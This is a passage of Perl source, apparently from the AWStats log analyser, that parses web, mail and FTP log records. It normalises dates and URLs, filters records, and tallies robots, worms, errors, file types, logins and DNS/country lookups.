        # Detected date format: dddddddddd, YYYY-MM-DD HH:MM:SS (IIS), MM/DD/YY\tHH:MM:SS,
        # DD/Month/YYYY:HH:MM:SS (Apache), DD/MM/YYYY HH:MM:SS, Mon DD HH:MM:SS
        $field[$pos_date] =~ tr/,-\/ \t/:::::/s;
        my @dateparts = split(/:/, $field[$pos_date]);
        if(!$dateparts[1]){ # Unix timestamp
            ($dateparts[5], $dateparts[4], $dateparts[3], $dateparts[0],
             $dateparts[1], $dateparts[2]) = localtime(int($field[$pos_date]));
            $dateparts[1]++;
            $dateparts[2] += 1900;
        }elsif($dateparts[0] =~ /^....$/){
            my $tmp = $dateparts[0];
            $dateparts[0] = $dateparts[2];
            $dateparts[2] = $tmp;
        }elsif($field[$pos_date] =~ /^..:..:..:/){
            $dateparts[2] += 2000;
            my $tmp = $dateparts[0];
            $dateparts[0] = $dateparts[1];
            $dateparts[1] = $tmp;
        }elsif($dateparts[0] =~ /^...$/){
            my $tmp = $dateparts[0];
            $dateparts[0] = $dateparts[1];
            $dateparts[1] = $tmp;
            $tmp          = $dateparts[5];
            $dateparts[5] = $dateparts[4];
            $dateparts[4] = $dateparts[3];
            $dateparts[3] = $dateparts[2];
            $dateparts[2] = $tmp || $nowyear;
        }
        if(exists($MonthNum{$dateparts[1]})){
            $dateparts[1] = $MonthNum{ $dateparts[1] };
        } # Change lib month in num month if necessary
        if($dateparts[1] <= 0){
            # Date corrupted (for example $dateparts[1]='dic' 
            # for december month in a spanish log file)
            $NbOfLinesCorrupted++;
            if($ShowCorrupted){
                print "Corrupted record line " .
                      ($lastlinenb + $NbOfLinesParsed) .
                      " (bad date format for month, may be month are not in english ?): $line\n";
            }
            next;
        }

        # Now @dateparts is (DD,MM,YYYY,HH,MM,SS) and 
        # we're going to create $timerecord=YYYYMMDDHHMMSS
        if($PluginsLoaded{'ChangeTime' }{'timezone'}){
            @dateparts = ChangeTime_timezone(\@dateparts);
        }
        my $yearrecord  = int($dateparts[2]);
        my $monthrecord = int($dateparts[1]);
        my $dayrecord   = int($dateparts[0]);
        my $hourrecord  = int($dateparts[3]);
        my $daterecord  = '';
        if($DatabaseBreak eq 'month'){
            $daterecord = sprintf("%04i%02i", $yearrecord, $monthrecord);
        }elsif($DatabaseBreak eq 'year'){
            $daterecord = sprintf("%04i%", $yearrecord);
        }elsif($DatabaseBreak eq 'day'){
            $daterecord =
              sprintf("%04i%02i%02i", $yearrecord, $monthrecord, $dayrecord);
        }elsif($DatabaseBreak eq 'hour'){
            $daterecord = sprintf("%04i%02i%02i%02i", $yearrecord, $monthrecord, $dayrecord, $hourrecord);
        }

        # TODO essayer de virer yearmonthrecord
        my $yearmonthdayrecord = sprintf("$dateparts[2]%02i%02i", $dateparts[1], $dateparts[0]);
        my $timerecord = ((int("$yearmonthdayrecord") * 100 + $dateparts[3]) * 100 +
                         $dateparts[4]) * 100 + $dateparts[5];

        # Check date
        if($LogType eq 'M' && $timerecord > $tomorrowtime){
            # Postfix/Sendmail does not store year, so we assume 
            # that year is year-1 if record is in future
            $yearrecord--;
            if($DatabaseBreak eq 'month'){
                $daterecord = sprintf("%04i%02i", $yearrecord, $monthrecord);
            }elsif($DatabaseBreak eq 'year'){
                $daterecord = sprintf("%04i%", $yearrecord);
            }elsif($DatabaseBreak eq 'day'){
                $daterecord = sprintf("%04i%02i%02i",
                    $yearrecord, $monthrecord, $dayrecord);
            }elsif($DatabaseBreak eq 'hour'){
                $daterecord = sprintf("%04i%02i%02i%02i",
                    $yearrecord, $monthrecord, $dayrecord, $hourrecord);
            }

            # TODO essayer de virer yearmonthrecord
            $yearmonthdayrecord = sprintf("$yearrecord%02i%02i", $dateparts[1], $dateparts[0]);
            $timerecord = ((int("$yearmonthdayrecord") * 100 + $dateparts[3]) * 100 +
                          $dateparts[4]) * 100 + $dateparts[5];
        }
        if($timerecord < 10000000000000 || $timerecord > $tomorrowtime){
            $NbOfLinesCorrupted++;
            if($ShowCorrupted){
                print "Corrupted record (invalid date, timerecord=$timerecord): $line\n";
            }
            next; # Should not happen, kept in case of parasite/corrupted line
        }
        if($NewLinePhase){
            # TODO NOTSORTEDRECORDTOLERANCE does not work around midnight
            if($timerecord < ($LastLine - $NOTSORTEDRECORDTOLERANCE)){
                # Should not happen, kept in case of parasite/corrupted old line
                $NbOfLinesCorrupted++;
                if($ShowCorrupted){
                    print "Corrupted record (date $timerecord lower than ".
                          "$LastLine-$NOTSORTEDRECORDTOLERANCE): $line\n";
                }
                next;
            }
        }else{
            if($timerecord <= $LastLine){ # Already processed
                $NbOfOldLines++;
                next;
            }

            # We found a new line. This will replace comparison "<=" with "<" 
            # between timerecord and LastLine (we should have only new lines now)
            $NewLinePhase = 1; # We will never enter here again
            if($ShowSteps) {
                if($NbOfLinesShowsteps > 1 && ($NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK)){
                    my $delay = &GetDelaySinceStart(0);
                    print "" . ($NbOfLinesParsed - 1) . " lines processed (" .
                          ($delay > 0 ? $delay : 1000) . " ms, " .
                          int(1000 * ($NbOfLinesShowsteps - 1) / ($delay > 0 ? $delay : 1000)) .
                          " lines/second)\n";
                }
                &GetDelaySinceStart(1);
                $NbOfLinesShowsteps = 1;
            }
            print "Phase 2 : Now process new records (Flush history on disk after " .
                  ($LIMITFLUSH << 2) . " hosts)...\n";
            # print "Phase 2 : Now process new records (Flush history on disk after ".
            # ($LIMITFLUSH<<2)." hosts or ".($LIMITFLUSH)." URLs)...\n";
        }

        # Convert URL for Webstar to common URL
        if($LogFormat eq '3'){
            $field[$pos_url] =~ s/:/\//g;
            if($field[$pos_code] eq '-'){ $field[$pos_code] = '200'; }
        }

        # Here, field array, timerecord and yearmonthdayrecord are initialized for log record
        # We found a new line
        if($timerecord > $LastLine){
            $LastLine = $timerecord;
        } # Test should always be true except with not sorted log files
        # Skip for some client host IP addresses, some URLs, other URLs
        if(@SkipHosts && (&SkipHost($field[$pos_host])
           || ($pos_hostr && &SkipHost($field[$pos_hostr])))){
            $qualifdrop = "Dropped record (host $field[$pos_host]" .
                          ($pos_hostr ? " and $field[$pos_hostr]" : "") .
                          " not qualified by SkipHosts)";
        }elsif(@SkipFiles && &SkipFile($field[$pos_url])){
            $qualifdrop = "Dropped record (URL $field[$pos_url] not qualified by SkipFiles)";
        }elsif(@SkipUserAgents && $pos_agent >= 0 && &SkipUserAgent($field[$pos_agent])){
            $qualifdrop = "Dropped record (user agent '$field[$pos_agent]' ".
                          "not qualified by SkipUserAgents)";
        }elsif(@SkipReferrers && $pos_referer >= 0 && &SkipReferrer($field[$pos_referer])){
            $qualifdrop = "Dropped record (URL $field[$pos_referer] not qualified by SkipReferrers)";
        }elsif(@OnlyHosts && !&OnlyHost($field[$pos_host])
               && (!$pos_hostr || !&OnlyHost($field[$pos_hostr]))){
            $qualifdrop = "Dropped record (host $field[$pos_host]" .
                          ($pos_hostr ? " and $field[$pos_hostr]" : "") .
                          " not qualified by OnlyHosts)";
        }elsif(@OnlyUsers && !&OnlyUser($field[$pos_logname])){
            $qualifdrop = "Dropped record (URL $field[$pos_logname] not qualified by OnlyUsers)";
        }elsif(@OnlyFiles && !&OnlyFile($field[$pos_url])){
            $qualifdrop = "Dropped record (URL $field[$pos_url] not qualified by OnlyFiles)";
        }elsif(@OnlyUserAgents && !&OnlyUserAgent($field[$pos_agent])){
            $qualifdrop = "Dropped record (user agent '$field[$pos_agent]' ".
                          "not qualified by OnlyUserAgents)";
        }
        if($qualifdrop){
            $NbOfLinesDropped++;
            if($ShowDropped){
                print "$qualifdrop: $line\n";
            }
            $qualifdrop = '';
            next;
        }

        # Record is approved
        # Is it in a new break section ?
        if($daterecord > $lastprocesseddate){
            # A new break to process
            if($lastprocesseddate > 0){
                # We save data of previous break
                &Read_History_With_TmpUpdate(
                    $lastprocessedyear, $lastprocessedmonth,
                    $lastprocessedday,  $lastprocessedhour, 1, 1,
                    "all", ($lastlinenb + $NbOfLinesParsed),
                    $lastlineoffset, &CheckSum($line));
                $counterforflushtest = 0; # We reset counterforflushtest
            }
            $lastprocessedyear  = $yearrecord;
            $lastprocessedmonth = $monthrecord;
            $lastprocessedday   = $dayrecord;
            $lastprocessedhour  = $hourrecord;
            if($DatabaseBreak eq 'month'){
                $lastprocesseddate = sprintf("%04i%02i", $yearrecord, $monthrecord);
            }elsif($DatabaseBreak eq 'year'){
                $lastprocesseddate = sprintf("%04i%", $yearrecord);
            }elsif($DatabaseBreak eq 'day'){
                $lastprocesseddate = sprintf("%04i%02i%02i", $yearrecord, $monthrecord, $dayrecord);
            }elsif($DatabaseBreak eq 'hour'){
                $lastprocesseddate = sprintf("%04i%02i%02i%02i",
                     $yearrecord, $monthrecord, $dayrecord, $hourrecord);
            }
        }

        $countedtraffic = 0;
        $NbOfNewLines++;
        # Convert $field[$pos_size]
        # if($field[$pos_size] eq '-'){$field[$pos_size]=0; }
        # Define a clean target URL and referrer URL
        # We keep a clean $field[$pos_url] and
        # we store original value for urlwithnoquery, tokenquery and standalonequery
        if($URLNotCaseSensitive){
            $field[$pos_url] = lc($field[$pos_url]);
        }
        # Possible URL syntax for $field[$pos_url]: 
        # /mydir/mypage.ext?param1=x&param2=y#aaa, /mydir/mypage.ext#aaa, /
        my $urlwithnoquery;
        my $tokenquery;
        my $standalonequery;
        my $anchor = '';
        if($field[$pos_url] =~ s/$regtruncanchor//o){
            $anchor = $1;
        } # Remove and save anchor
        if($URLWithQuery){
            $urlwithnoquery  = $field[$pos_url];
            my $foundparam   = ($urlwithnoquery =~ s/$regtruncurl//o);
            $tokenquery      = $1 || '';
            $standalonequery = $2 || '';

            # For IIS setup, if pos_query is enabled 
            # we need to combine the URL to query strings
            if(!$foundparam && $pos_query >= 0
                && $field[$pos_query] && $field[$pos_query] ne '-'){
                $foundparam      = 1;
                $tokenquery      = '?';
                $standalonequery = $field[$pos_query];
                # Define query
                $field[$pos_url] .= '?' . $field[$pos_query];
            }
            if($foundparam){
                # Keep only params that are defined in URLWithQueryWithOnlyFollowingParameters
                my $newstandalonequery = '';
                if(@URLWithQueryWithOnly){
                    foreach (@URLWithQueryWithOnly){
                        foreach my $p (split(/&/, $standalonequery)){
                            if($URLNotCaseSensitive){
                                if($p =~ /^$_=/i){
                                    $newstandalonequery .= "$p&";
                                    last;
                                }
                            }else{
                                if($p =~ /^$_=/){
                                    $newstandalonequery .= "$p&";
                                    last;
                                }
                            }
                        }
                    }
                    chop $newstandalonequery;
                }elsif(@URLWithQueryWithout){
                    # Remove params that are marked to be ignored 
                    # in URLWithQueryWithoutFollowingParameters
                    foreach my $p (split(/&/, $standalonequery)){
                        my $found = 0;
                        foreach (@URLWithQueryWithout){
                            if($URLNotCaseSensitive){
                                if($p =~ /^$_=/i){
                                    $found = 1; last;
                                }
                            }else{
                                if($p =~ /^$_=/){
                                    $found = 1; last;
                                }
                            }
                        }
                        if(!$found){
                            $newstandalonequery .= "$p&";
                        }
                    }
                    chop $newstandalonequery;
                }else{
                    $newstandalonequery = $standalonequery;
                }

                # Define query
                $field[$pos_url] = $urlwithnoquery;
                if($newstandalonequery){
                    $field[$pos_url] .= "$tokenquery$newstandalonequery";
                }
            }
        }else{
            # Trunc parameters of URL
            $field[$pos_url] =~ s/$regtruncurl//o;
            $urlwithnoquery  = $field[$pos_url];
            $tokenquery      = $1 || '';
            $standalonequery = $2 || '';

            # For IIS setup, if pos_query is enabled we need to use it for query strings
            if($pos_query >= 0 && $field[$pos_query] && $field[$pos_query] ne '-'){
                $tokenquery      = '?';
                $standalonequery = $field[$pos_query];
            }
        }
        if($URLWithAnchor && $anchor){
            $field[$pos_url] .= "#$anchor";
        }
        
        # Restore anchor
        # Here now urlwithnoquery is /mydir/mypage.ext, /mydir, /, /page#XXX
        # Here now tokenquery is '' or '?' or ';'
        # Here now standalonequery is '' or 'param1=x'

        # Define page and extension
        # Extension
        my $PageBool = 1;
        my $extension = Get_Extension($regext, $urlwithnoquery);
        if($NotPageList{$extension} || 
           ($MimeHashLib{$extension}[1]) && 
           $MimeHashLib{$extension}[1] ne 'p'){
            $PageBool = 0;
        }
        if(@NotPageFiles && &NotPageFile($field[$pos_url])){
            $PageBool = 0;
        }

        # Analyze: misc tracker (must be before return code)
        if($urlwithnoquery =~ /$regmisc/o){
            my $foundparam = 0;
            foreach (split(/&/, $standalonequery)){
                if($_ =~ /^screen=(\d+)x(\d+)/i){
                    $foundparam++;
                    $_screensize_h{"$1x$2"}++;
                    next;
                }

                #if($_ =~ /cdi=(\d+)/i){
                #    $foundparam++;
                #    $_screendepth_h{"$1"}++;
                #    next;
                #}
                if($_ =~ /^nojs=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"JavascriptDisabled"}++;
                    }
                    next;
                }
                if($_ =~ /^java=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'true'){
                        $_misc_h{"JavaEnabled"}++;
                    }
                    next;
                }
                if($_ =~ /^shk=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"DirectorSupport"}++;
                    }
                    next;
                }
                if($_ =~ /^fla=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"FlashSupport"}++;
                    }
                    next;
                }
                if($_ =~ /^rp=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"RealPlayerSupport" }++;
                    }
                    next;
                }
                if($_ =~ /^mov=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"QuickTimeSupport" }++;
                    }
                    next;
                }
                if($_ =~ /^wma=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"WindowsMediaPlayerSupport" }++;
                    }
                    next;
                }
                if($_ =~ /^pdf=(\w+)/i){
                    $foundparam++;
                    if($1 eq 'y'){
                        $_misc_h{"PDFSupport" }++;
                    }
                    next;
                }
            }
            if($foundparam){
                $_misc_h{"TotalMisc" }++;
            }
        }

        # Analyze: successful favicon (=> countedtraffic=1 if favicon)
        if($urlwithnoquery =~ /$regfavico/o){
            if($field[$pos_code] != 404){
                $_misc_h{'AddToFavourites'}++;
            }
            # favicon is a case that must not be counted anywhere else
            $countedtraffic = 1;
            $_time_nv_h[$hourrecord]++;
            if($field[$pos_code] != 404 && $pos_size>0){
                $_time_nv_k[$hourrecord] += int($field[$pos_size]);
            }
        }

        # Analyze: Worms (=> countedtraffic=2 if worm)
        #---------------------------------------------
        if(!$countedtraffic){
            if($LevelForWormsDetection){
                foreach (@WormsSearchIDOrder){
                    if($field[$pos_url] =~ /$_/){
                        # It's a worm
                        my $worm = &UnCompileRegex($_);
                        $worm = $WormsHashID{$worm } || 'unknown';
                        $_worm_h{$worm }++;
                        if($pos_size>0){
                            $_worm_k{$worm} += int($field[$pos_size]);
                        }
                        $_worm_l{$worm} = $timerecord;
                        $countedtraffic = 2;
                        if($PageBool){
                            $_time_nv_p[$hourrecord]++;
                        }
                        $_time_nv_h[$hourrecord]++;
                        if($pos_size>0){
                            $_time_nv_k[$hourrecord] += int($field[$pos_size]);
                        }
                        last;
                    }
                }
            }
        }

        # Analyze: Status code (=> countedtraffic=3 if error)
        if(!$countedtraffic){
            if($LogType eq 'W' || $LogType eq 'S'){
                # HTTP record or Stream record
                if($ValidHTTPCodes{$field[$pos_code]}){ # Code is valid
                    if(int($field[$pos_code]) == 304 && $pos_size>0){
                        $field[$pos_size] = 0;
                    }
                    # track downloads
                    if(int($field[$pos_code]) == 200 && $MimeHashLib{$extension }[1] eq 'd'){
                        $_downloads{$urlwithnoquery }->{'AWSTATS_HITS' }++;
                        $_downloads{$urlwithnoquery }->{'AWSTATS_SIZE' } += ($pos_size>0 ? int($field[$pos_size]) : 0);
                    }
                    # handle 206 download continuation message IF we had a 
                    # successful 200 before, otherwise it goes in errors
                }elsif(int($field[$pos_code]) == 206 && ($MimeHashLib{$extension }[1] eq 'd')){
                    $_downloads{$urlwithnoquery }->{'AWSTATS_SIZE' } += ($pos_size>0 ? int($field[$pos_size]) : 0);
                    $_downloads{$urlwithnoquery }->{'AWSTATS_206' }++;
                    
                    #$_downloads{$urlwithnoquery }->{$field[$pos_host] }[1] = $timerecord;
                    if($pos_size>0){
                        #$_downloads{$urlwithnoquery }->{$field[$pos_host] }[2] = int($field[$pos_size]);
                        $DayBytes{$yearmonthdayrecord } += int($field[$pos_size]);
                        $_time_k[$hourrecord] += int($field[$pos_size]);
                    }
                    # 206 continued download, so we track bandwidth but not pages or hits
                    $countedtraffic = 6;
                }else{ # Code is not valid
                    if($field[$pos_code] !~ /^\d\d\d$/){
                        $field[$pos_code] = 999;
                    }
                    $_errors_h{ $field[$pos_code]}++;
                    if($pos_size>0){
                        $_errors_k{ $field[$pos_code] } += int($field[$pos_size]);
                    }
                    foreach my $code (keys %TrapInfosForHTTPErrorCodes){
                        if($field[$pos_code] == $code){
                        # This is an error code which referrer need to be tracked
                            my $newurl = substr($field[$pos_url], 0, $MaxLengthOfStoredURL);
                            $newurl =~ s/[$URLQuerySeparators].*$//;
                            $_sider404_h{$newurl}++;
                            if($pos_referer >= 0){
                                my $newreferer = $field[$pos_referer];
                                if(!$URLReferrerWithQuery){
                                    $newreferer =~ s/[$URLQuerySeparators].*$//;
                                }
                                $_referer404_h{$newurl } = $newreferer;
                                last;
                            }
                        }
                    }
                    $countedtraffic = 3;
                    if($PageBool){
                        $_time_nv_p[$hourrecord]++;
                    }
                    $_time_nv_h[$hourrecord]++;
                    if($pos_size>0){
                        $_time_nv_k[$hourrecord] += int($field[$pos_size]);
                    }
                }
            }elsif($LogType eq 'M'){ # Mail record
                if(!$ValidSMTPCodes{$field[$pos_code]}){ # Code is not valid
                    $_errors_h{ $field[$pos_code]}++;
                    if($field[$pos_size] ne '-' && $pos_size>0){
                        $_errors_k{ $field[$pos_code]} += int($field[$pos_size]);
                    }
                    $countedtraffic = 3;
                    if($PageBool){
                        $_time_nv_p[$hourrecord]++;
                    }
                    $_time_nv_h[$hourrecord]++;
                    if($field[$pos_size] ne '-' && $pos_size>0){
                        $_time_nv_k[$hourrecord] += int($field[$pos_size]);
                    }
                }
            }elsif($LogType eq 'F'){
                # FTP record
            }
        }

        # Analyze: Robot from robot database (=> countedtraffic=4 if robot)
        if(!$countedtraffic){
            if($pos_agent >= 0){
                if($DecodeUA){
                    $field[$pos_agent] =~ s/%20/_/g;
                } # This is to support servers (like Roxen) that writes user agent with %20 in it
                $UserAgent = $field[$pos_agent];
                if($UserAgent && $UserAgent eq '-'){
                    $UserAgent = '';
                }
                if($LevelForRobotsDetection){
                    if($UserAgent) {
                        my $uarobot = $TmpRobot{$UserAgent};
                        if(!$uarobot){
                            #study $UserAgent; Does not increase speed
                            foreach (@RobotsSearchIDOrder){
                                if($UserAgent =~ /$_/){
                                    my $bot = &UnCompileRegex($_);
                                    # Last time, we won't search if robot or not. We know it is.
                                    $TmpRobot{$UserAgent} = $uarobot = "$bot";
                                    last;
                                }
                            }
                            if(!$uarobot){
                                # Last time, we won't search if robot or not. We know it's not.
                                $TmpRobot{$UserAgent} = $uarobot = '-';
                            }
                        }
                        if($uarobot ne '-'){
                            # If robot, we stop here
                            $_robot_h{$uarobot}++;
                            if($field[$pos_size] ne '-' && $pos_size>0){
                                $_robot_k{$uarobot} += int($field[$pos_size]);
                            }
                            $_robot_l{$uarobot} = $timerecord;
                            if($urlwithnoquery =~ /$regrobot/o){
                                $_robot_r{$uarobot}++;
                            }
                            $countedtraffic = 4;
                            if($PageBool){
                                $_time_nv_p[$hourrecord]++;
                            }
                            $_time_nv_h[$hourrecord]++;
                            if($field[$pos_size] ne '-' && $pos_size>0){
                                $_time_nv_k[$hourrecord] += int($field[$pos_size]);
                            }
                        }
                    }else{
                        my $uarobot = 'no_user_agent';
                        # It's a robot or at least a bad browser, we stop here
                        $_robot_h{$uarobot}++;
                        if($pos_size>0){
                            $_robot_k{$uarobot} += int($field[$pos_size]);
                        }
                        $_robot_l{$uarobot} = $timerecord;
                        if($urlwithnoquery =~ /$regrobot/o){
                            $_robot_r{$uarobot}++;
                        }
                        $countedtraffic = 4;
                        if($PageBool){
                            $_time_nv_p[$hourrecord]++;
                        }
                        $_time_nv_h[$hourrecord]++;
                        if($pos_size>0){
                            $_time_nv_k[$hourrecord] += int($field[$pos_size]);
                        }
                    }
                }
            }
        }

        # Analyze: Robot from "hit on robots.txt" file (=> countedtraffic=5 if robot)
        if(!$countedtraffic){
            if($urlwithnoquery =~ /$regrobot/o){
                $_robot_h{'unknown'}++;
                if($pos_size>0){
                    $_robot_k{'unknown' } += int($field[$pos_size]);
                }
                $_robot_l{'unknown' } = $timerecord;
                $_robot_r{'unknown' }++;
                $countedtraffic = 5; # Must not be counted somewhere else
                if($PageBool){
                    $_time_nv_p[$hourrecord]++;
                }
                $_time_nv_h[$hourrecord]++;
                if($pos_size>0){
                    $_time_nv_k[$hourrecord] += int($field[$pos_size]);
                }
            }
        }

        # Analyze: File type - Compression
        if(!$countedtraffic || $countedtraffic == 6){
            if($LevelForFileTypesDetection){
                if($countedtraffic != 6){
                    $_filetypes_h{$extension }++;
                }
                if($field[$pos_size] ne '-' && $pos_size>0){
                    $_filetypes_k{$extension } += int($field[$pos_size]);
                }

                # Compression
                if($pos_gzipin >= 0 && $field[$pos_gzipin]){
                    # If in and out in log
                    my ($notused, $in) = split(/:/, $field[$pos_gzipin]);
                    my ($notused1, $out, $notused2) = split(/:/, $field[$pos_gzipout]);
                    if($out){
                        $_filetypes_gz_in{$extension }  += $in;
                        $_filetypes_gz_out{$extension } += $out;
                    }
                }elsif($pos_compratio >= 0 && ($field[$pos_compratio] =~ /(\d+)/)){
                    # Calculate in/out size from percentage
                    if($fieldlib[$pos_compratio] eq 'gzipratio'){
                    # with mod_gzip: % is size (before-after)/before (low for jpg) ??????????
                        $_filetypes_gz_in{$extension } += int($field[$pos_size] * 100 / ((100 - $1) || 1));
                    }else{
                        # with mod_deflate: % is size after/before (high for jpg)
                        $_filetypes_gz_in{$extension } += int($field[$pos_size] * 100 / ($1 || 1));
                    }
                    if($pos_size>0){
                        $_filetypes_gz_out{$extension } += int($field[$pos_size]);
                    }
                }
            }

            # Analyze: Date - Hour - Pages - Hits - Kilo
            if($PageBool){
                # Replace default page name with / only 
                # ('if' is to increase speed when only 1 value in @DefaultFile)
                if(@DefaultFile > 1){
                    foreach my $elem (@DefaultFile){
                        if($field[$pos_url] =~ s/\/$elem$/\//){
                            last;
                        }
                    }
                }else{
                    $field[$pos_url] =~ s/$regdefault/\//o;
                }

                # FirstTime and LastTime are First and Last human 
                # visits (so changed if access to a page)
                $FirstTime{$lastprocesseddate} ||= $timerecord;
                $LastTime{$lastprocesseddate} = $timerecord;
                $DayPages{$yearmonthdayrecord}++;
                $_url_p{ $field[$pos_url]}++; #Count accesses for page (page)
                if($field[$pos_size] ne '-' && $pos_size>0){
                    $_url_k{$field[$pos_url]} += int($field[$pos_size]);
                }
                $_time_p[$hourrecord]++;
                # Count accesses for hour (page)
                # TODO Use an id for hash key of url
                # $_url_t{$_url_id }
            }
            if($countedtraffic != 6){
                $_time_h[$hourrecord]++;
            }
            if($countedtraffic != 6){
                $DayHits{$yearmonthdayrecord }++;
            }#Count accesses for hour (hit)
            if($field[$pos_size] ne '-' && $pos_size>0){
                $_time_k[$hourrecord] += int($field[$pos_size]);
                $DayBytes{$yearmonthdayrecord } += int($field[$pos_size]);
                #Count accesses for hour (kb)
            }

            # Analyze: Login
            if($pos_logname >= 0 && $field[$pos_logname] && $field[$pos_logname] ne '-'){
                # This is to allow space in logname
                $field[$pos_logname] =~ s/ /_/g;
                if($LogFormat eq '6'){
                    $field[$pos_logname] =~ s/^\"//;
                    $field[$pos_logname] =~ s/\"$//;
                } # logname field has " with Domino 6+
                if($AuthenticatedUsersNotCaseSensitive){
                    $field[$pos_logname] = lc($field[$pos_logname]);
                }

                # We found an authenticated user
                if($PageBool){
                    $_login_p{$field[$pos_logname]}++;
                } #Count accesses for page (page)
                if($countedtraffic != 6){
                    $_login_h{$field[$pos_logname]}++;
                } #Count accesses for page (hit)
                if($pos_size>0){
                    $_login_k{$field[$pos_logname]} += int($field[$pos_size]);
                } #Count accesses for page (kb)
                $_login_l{$field[$pos_logname]} = $timerecord;
            }
        }

        # Do DNS lookup
        # HostResolved will be defined in next paragraf if countedtraffic is true
        my $Host = $field[$pos_host];
        my $HostResolved = '';
        if(!$countedtraffic || $countedtraffic == 6){
            my $ip = 0;
            if($DNSLookup){ # DNS lookup is 1 or 2
                if($Host =~ /$regipv4l/o){ # IPv4 lighttpd
                    $Host =~ s/^::ffff://;
                    $ip = 4;
                }elsif($Host =~ /$regipv4/o){ # IPv4
                    $ip = 4;
                }elsif($Host =~ /$regipv6/o){ # IPv6
                    $ip = 6;
                }
                if($ip){
                    # Check in static DNS cache file
                    $HostResolved = $MyDNSTable{$Host};
                    if($HostResolved){
                        ; # debug;
                    }elsif($DNSLookup == 1){
                        # Check in session cache (dynamic DNS cache file + session DNS cache)
                        $HostResolved = $TmpDNSLookup{$Host };
                        if(!$HostResolved){
                            if(@SkipDNSLookupFor && &SkipDNSLookup($Host)){
                                $HostResolved = $TmpDNSLookup{$Host } = '*';
                            }else{
                                if($ip == 4){
                                    # This is very slow, may spend 20 seconds
                                    my $lookupresult = gethostbyaddr(pack("C4", split(/\./, $Host)), AF_INET);
                                    if(!$lookupresult || $lookupresult =~ /$regipv4/o || !IsAscii($lookupresult)){
                                        $TmpDNSLookup{$Host} = $HostResolved = '*';
                                    }else{
                                        $TmpDNSLookup{$Host} = $HostResolved = $lookupresult;
                                    }
                                }elsif($ip == 6){
                                    if($PluginsLoaded{'GetResolvedIP'}{'ipv6'}){
                                        my $lookupresult = GetResolvedIP_ipv6($Host);
                                        if(!$lookupresult || !IsAscii($lookupresult)){
                                            $TmpDNSLookup{$Host} = $HostResolved = '*';
                                        }else{
                                            $TmpDNSLookup{$Host} = $HostResolved = $lookupresult;
                                        }
                                    }else{
                                        $TmpDNSLookup{$Host } = $HostResolved = '*';
                                        warning("Reverse DNS lookup for $Host not ".
                                                "available without ipv6 plugin enabled.");
                                    }
                                }else {
                                    error("Bad value vor ip");
                                }
                            }
                        }
                    }else{
                        $HostResolved = '*';
                    }
                }else{
                    $DNSLookupAlreadyDone = $LogFile;
                }
            }else{
                if($Host =~ /$regipv4l/o){
                    $Host =~ s/^::ffff://;
                    $HostResolved = '*';
                    $ip           = 4;
                }elsif($Host =~ /$regipv4/o){ # IPv4
                    $HostResolved = '*';
                    $ip           = 4;
                }elsif($Host =~ /$regipv6/o){
                    $HostResolved = '*';
                    $ip           = 6;
                } # IPv6
            }

            # Analyze: Country (Top-level domain)
            # Set $HostResolved to host and resolve domain
            my $Domain = 'ip';
            if($HostResolved eq '*'){
                # $Host is an IP address and is not resolved 
                # (failed or not asked) or resolution gives an IP address
                # Resolve Domain
                $HostResolved = $Host;
                if($PluginsLoaded{'GetCountryCodeByAddr' }{'geoip' }){
                    $Domain = GetCountryCodeByAddr_geoip($HostResolved);
                }
                # elsif($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}){
                #     $Domain=GetCountryCodeByAddr_geoip_region_maxmind($HostResolved);
                # }elsif($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'}){
                #     $Domain=GetCountryCodeByAddr_geoip_city_maxmind($HostResolved);
                # }
                elsif($PluginsLoaded{'GetCountryCodeByAddr' }{'geoipfree' }){
                    $Domain = GetCountryCodeByAddr_geoipfree($HostResolved);
                }
                if($AtLeastOneSectionPlugin){
                    foreach my $pluginname (keys %{ $PluginsLoaded{'SectionProcessIp'}}){
                        my $function = "SectionProcessIp_$pluginname";
                        &$function($HostResolved);
                    }
                }
            }else{
                # $Host was already a host name ($ip=0, $Host=name, $HostResolved='') 
                # or has been resolved ($ip>0, $Host=ip, $HostResolved defined)
                # Resolve Domain
                $HostResolved = lc($HostResolved ? $HostResolved : $Host);
                if($ip){
                    # If we have ip, we use it in priority instead of hostname
                    if($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'}){
                        $Domain = GetCountryCodeByAddr_geoip($Host);
                    }
                    # elsif($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}){
                    #     $Domain=GetCountryCodeByAddr_geoip_region_maxmind($Host);
                    # }elsif($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'}){
                    #     $Domain=GetCountryCodeByAddr_geoip_city_maxmind($Host);
                    # }
                    elsif($PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'}){
                        $Domain = GetCountryCodeByAddr_geoipfree($Host);
                    }elsif($HostResolved =~ /\.(\w+)$/){
                        $Domain = $1;
                    }
                    if($AtLeastOneSectionPlugin){
                        foreach my $pluginname (keys %{ $PluginsLoaded{'SectionProcessIp'}}){
                            my $function = "SectionProcessIp_$pluginname";
                            &$function($Host);
                        }
                    }
                }else{
                    if($PluginsLoaded{'GetCountryCodeByName'}{'geoip'}){
                        $Domain = GetCountryCodeByName_geoip($HostResolved);
                    }
                    # elsif($PluginsLoaded{'GetCountryCodeByName'}{'geoip_region_maxmind'}){
                    #     $Domain=GetCountryCodeByName_geoip_region_maxmind($HostResolved);
                    # }elsif($PluginsLoaded{'GetCountryCodeByName'}{'geoip_city_maxmind'}){
                    #     $Domain=GetCountryCodeByName_geoip_city_maxmind($HostResolved);
                    # }
                    elsif($PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'}){
                        $Domain = GetCountryCodeByName_geoipfree($HostResolved);
                    }elsif($HostResolved =~ /\.(\w+)$/){
                        $Domain = $1;
                    }
                    if($AtLeastOneSectionPlugin){
